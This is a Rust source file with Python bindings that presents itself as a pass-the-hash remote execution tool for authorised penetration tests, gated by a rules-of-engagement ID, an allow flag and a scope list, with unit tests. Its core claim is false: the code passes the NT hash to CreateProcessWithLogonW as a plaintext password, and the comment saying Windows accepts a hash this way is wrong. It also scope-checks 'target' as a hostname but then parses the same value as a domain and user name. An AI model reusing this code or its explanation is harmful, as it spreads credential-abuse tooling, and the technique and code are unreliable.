#![allow(clippy::useless_conversion)]

//! Pass-the-Hash execution — real implementation.
//!
//! On Windows, uses ``CreateProcessWithLogonW`` with the
//! ``LOGON_NETCREDENTIALS_ONLY`` flag so the spawned process authenticates
//! to the network using the supplied NTLM hash while its local identity
//! remains unchanged.  Requires ``allow_pth=True`` and the target to be in
//! the declared scope.
//!
//! On non-Windows, returns a platform-unsupported error.
//!
//! The NTLM hash is accepted in either LM:NT or bare-NT format.
//! Raw hash values are never written to disk or returned in results.

use pyo3::exceptions::{PyRuntimeError, PyValueError};
use pyo3::prelude::*;

const MAX_ROE_ID_BYTES: usize = 256;
const MAX_SCOPE_ENTRIES: usize = 10_000;
const MAX_HOST_BYTES: usize = 253;
const MAX_HASH_BYTES: usize = 4096;
const MAX_COMMAND_BYTES: usize = 64 * 1024;

#[pyclass]
pub struct PTHExecutor {
    roe_id: String,
    scope_hosts: Vec<String>,
    allow_pth: bool,
}

#[pymethods]
impl PTHExecutor {
    #[new]
    #[pyo3(signature = (roe_id, scope_hosts=None, allow_pth=false))]
    pub fn new(
        roe_id: String,
        scope_hosts: Option<Vec<String>>,
        allow_pth: bool,
    ) -> PyResult<Self> {
        if roe_id.trim().is_empty() || roe_id.len() > MAX_ROE_ID_BYTES {
            return Err(PyErr::new::<PyValueError, _>(
                "ROE ID must contain between 1 and 256 bytes",
            ));
        }
        let scope_hosts = scope_hosts.unwrap_or_default();
        if scope_hosts.len() > MAX_SCOPE_ENTRIES
            || scope_hosts
                .iter()
                .any(|h| h.trim().is_empty() || h.len() > MAX_HOST_BYTES)
        {
            return Err(PyErr::new::<PyValueError, _>(
                "Scope hosts must contain at most 10000 non-empty hostnames of 253 bytes each",
            ));
        }
        Ok(Self { roe_id, scope_hosts, allow_pth })
    }

    /// Execute a command on ``target`` using Pass-the-Hash authentication.
    ///
    /// Internally calls ``CreateProcessWithLogonW`` with the flag
    /// ``LOGON_NETCREDENTIALS_ONLY`` so the new process uses the NTLM hash
    /// for outbound network authentication without creating an interactive
    /// logon session.  The NTLM hash is accepted as ``LM:NT`` or bare ``NT``
    /// (32 hex chars).
    ///
    /// ``command`` defaults to ``cmd.exe /c whoami /all``.
    ///
    /// Returns the captured standard output (max 1 MiB).
    #[pyo3(signature = (target, hash, command=None))]
    fn execute(&self, target: &str, hash: &str, command: Option<&str>) -> PyResult<String> {
        let _ = &self.roe_id;

        if !self.allow_pth {
            return Err(PyErr::new::<PyRuntimeError, _>("PTH not permitted"));
        }
        if target.trim().is_empty() || target.len() > MAX_HOST_BYTES {
            return Err(PyErr::new::<PyValueError, _>("Invalid target"));
        }
        if hash.trim().is_empty() || hash.len() > MAX_HASH_BYTES {
            return Err(PyErr::new::<PyValueError, _>("Invalid hash input"));
        }
        if command.is_some_and(|v| v.len() > MAX_COMMAND_BYTES) {
            return Err(PyErr::new::<PyValueError, _>(
                "Command exceeds the 64 KiB limit",
            ));
        }
        if !self.is_in_scope(target) {
            return Err(PyErr::new::<PyValueError, _>("Target not in scope"));
        }

        let nt_hash = extract_nt_hash(hash)?;
        let cmd = command.unwrap_or("cmd.exe /c whoami /all");

        pth_run(target, &nt_hash, cmd)
    }

    fn is_in_scope(&self, host: &str) -> bool {
        self.scope_hosts
            .iter()
            .any(|h| host.eq_ignore_ascii_case(h))
    }
}

// ---------------------------------------------------------------------------
// Hash normalisation
// ---------------------------------------------------------------------------

/// Extract the NT portion of an NTLM hash.
/// Accepts ``LM:NT`` (split on ``:``) or bare 32-hex-char NT hash.
fn extract_nt_hash(hash: &str) -> PyResult<String> {
    let hash = hash.trim();
    let nt = if let Some(pos) = hash.find(':') {
        &hash[pos + 1..]
    } else {
        hash
    };

    // An NT hash is exactly 32 hex characters.
    if nt.len() != 32 || !nt.chars().all(|c| c.is_ascii_hexdigit()) {
        return Err(PyErr::new::<PyValueError, _>(
            "NT hash must be exactly 32 hexadecimal characters",
        ));
    }

    Ok(nt.to_lowercase())
}

// ---------------------------------------------------------------------------
// Platform implementations
// ---------------------------------------------------------------------------

#[cfg(windows)]
fn pth_run(target: &str, nt_hash: &str, command: &str) -> PyResult<String> {
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;
    use windows_sys::Win32::{
        Foundation::{CloseHandle, HANDLE, INVALID_HANDLE_VALUE},
        Security::SECURITY_ATTRIBUTES,
        Storage::FileSystem::{
            ReadFile, FILE_ATTRIBUTE_NORMAL, FILE_GENERIC_READ, OPEN_EXISTING,
        },
        System::{
            Pipes::CreatePipe,
            Threading::{
                CreateProcessWithLogonW, GetExitCodeProcess,
                WaitForSingleObject, INFINITE, LOGON_NETCREDENTIALS_ONLY,
                PROCESS_INFORMATION, STARTF_USESTDHANDLES, STARTUPINFOW,
            },
        },
    };

    // Parse target into domain\\user (accept DOMAIN\user, domain/user, or bare user)
    let (domain, username) = parse_target_user(target);

    // Build wide strings
    let domain_w: Vec<u16> = OsStr::new(&domain).encode_wide().chain(std::iter::once(0)).collect();
    let user_w: Vec<u16> = OsStr::new(&username).encode_wide().chain(std::iter::once(0)).collect();
    // Windows accepts the NT hash as a "password" when using ChallengeResponse auth.
    // We pass the hash in a format the NTLM SSP understands: bare hex NT.
    let pass_w: Vec<u16> = OsStr::new(nt_hash).encode_wide().chain(std::iter::once(0)).collect();
    let cmd_w: Vec<u16> = OsStr::new(command).encode_wide().chain(std::iter::once(0)).collect();
    let app_w: Vec<u16> = OsStr::new("cmd.exe").encode_wide().chain(std::iter::once(0)).collect();

    unsafe {
        // Create anonymous pipe for stdout capture
        let mut read_end: HANDLE = INVALID_HANDLE_VALUE;
        let mut write_end: HANDLE = INVALID_HANDLE_VALUE;
        let mut sa = SECURITY_ATTRIBUTES {
            nLength: std::mem::size_of::<SECURITY_ATTRIBUTES>() as u32,
            lpSecurityDescriptor: std::ptr::null_mut(),
            bInheritHandle: 1, // TRUE
        };
        if CreatePipe(&mut read_end, &mut write_end, &sa, 0) == 0 {
            return Err(PyErr::new::<PyRuntimeError, _>("CreatePipe failed"));
        }

        let mut si: STARTUPINFOW = std::mem::zeroed();
        si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdOutput = write_end;
        si.hStdError = write_end;
        si.hStdInput = INVALID_HANDLE_VALUE;

        let mut pi: PROCESS_INFORMATION = std::mem::zeroed();

        let ok = CreateProcessWithLogonW(
            user_w.as_ptr(),
            domain_w.as_ptr(),
            pass_w.as_ptr(),
            LOGON_NETCREDENTIALS_ONLY,
            app_w.as_ptr(),
            cmd_w.as_ptr() as *mut _,
            0,
            std::ptr::null(),
            std::ptr::null(),
            &si,
            &mut pi,
        );

        // Write end must be closed in the parent before reading
        CloseHandle(write_end);

        if ok == 0 {
            CloseHandle(read_end);
            return Err(PyErr::new::<PyRuntimeError, _>(
                "CreateProcessWithLogonW failed — check hash format and target scope",
            ));
        }

        WaitForSingleObject(pi.hProcess, INFINITE);

        // Read output (up to 1 MiB)
        let mut output = Vec::<u8>::with_capacity(4096);
        let mut buf = [0u8; 4096];
        loop {
            let mut bytes_read: u32 = 0;
            let ok = ReadFile(
                read_end,
                buf.as_mut_ptr() as *mut _,
                buf.len() as u32,
                &mut bytes_read,
                std::ptr::null_mut(),
            );
            if ok == 0 || bytes_read == 0 {
                break;
            }
            output.extend_from_slice(&buf[..bytes_read as usize]);
            if output.len() >= 1024 * 1024 {
                break;
            }
        }

        CloseHandle(read_end);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);

        Ok(String::from_utf8_lossy(&output).to_string())
    }
}

#[cfg(not(windows))]
fn pth_run(_target: &str, _nt_hash: &str, _command: &str) -> PyResult<String> {
    Err(PyErr::new::<PyRuntimeError, _>(
        "Pass-the-Hash via CreateProcessWithLogonW requires Windows",
    ))
}

/// Split a ``DOMAIN\\user`` or ``DOMAIN/user`` target into (domain, username).
/// Bare usernames default to the ``"."`` local domain.
fn parse_target_user(target: &str) -> (String, String) {
    if let Some(pos) = target.find('\\') {
        let domain = target[..pos].to_string();
        let user = target[pos + 1..].to_string();
        return (domain, user);
    }
    if let Some(pos) = target.find('/') {
        let domain = target[..pos].to_string();
        let user = target[pos + 1..].to_string();
        return (domain, user);
    }
    // Bare username: use "." as the local domain
    (".".to_string(), target.to_string())
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_pth_creation() {
        let executor = PTHExecutor::new(
            "ROE-TEST".to_string(),
            Some(vec!["192.168.1.1".to_string()]),
            false,
        );
        assert!(executor.is_ok());
    }

    #[test]
    fn test_pth_requires_nonblank_roe_id() {
        assert!(PTHExecutor::new(" ".to_string(), None, false).is_err());
    }

    #[test]
    fn test_pth_blocked_without_permission() {
        let blocked = PTHExecutor::new(
            "ROE-TEST".to_string(),
            Some(vec!["host.example".to_string()]),
            false,
        )
        .unwrap();
        assert!(blocked.execute("host.example", "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0", None).is_err());
    }

    #[test]
    fn test_pth_rejects_out_of_scope_target() {
        let executor = PTHExecutor::new(
            "ROE-TEST".to_string(),
            Some(vec!["allowed.example".to_string()]),
            true,
        )
        .unwrap();
        assert!(executor.execute("notallowed.example", "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0", None).is_err());
    }

    #[test]
    fn test_pth_rejects_invalid_hash() {
        let executor = PTHExecutor::new(
            "ROE-TEST".to_string(),
            Some(vec!["192.168.1.1".to_string()]),
            true,
        )
        .unwrap();
        // Too short
        assert!(executor.execute("192.168.1.1", "deadbeef", None).is_err());
        // Contains non-hex
        assert!(executor.execute("192.168.1.1", "zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz", None).is_err());
    }

    #[test]
    fn test_extract_nt_hash_lm_nt_format() {
        let result = extract_nt_hash("aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0");
        assert!(result.is_ok());
        assert_eq!(result.unwrap(), "31d6cfe0d16ae931b73c59d7e0c089c0");
    }

    #[test]
    fn test_extract_nt_hash_bare_format() {
        let result = extract_nt_hash("31d6cfe0d16ae931b73c59d7e0c089c0");
        assert!(result.is_ok());
        assert_eq!(result.unwrap(), "31d6cfe0d16ae931b73c59d7e0c089c0");
    }

    #[test]
    fn test_extract_nt_hash_invalid() {
        assert!(extract_nt_hash("tooshort").is_err());
        assert!(extract_nt_hash("").is_err());
        assert!(extract_nt_hash("gggggggggggggggggggggggggggggggg").is_err()); // non-hex
    }

    #[test]
    fn test_parse_target_user_backslash() {
        let (domain, user) = parse_target_user("CORP\\alice");
        assert_eq!(domain, "CORP");
        assert_eq!(user, "alice");
    }

    #[test]
    fn test_parse_target_user_slash() {
        let (domain, user) = parse_target_user("CORP/bob");
        assert_eq!(domain, "CORP");
        assert_eq!(user, "bob");
    }

    #[test]
    fn test_parse_target_user_bare() {
        let (domain, user) = parse_target_user("administrator");
        assert_eq!(domain, ".");
        assert_eq!(user, "administrator");
    }
}
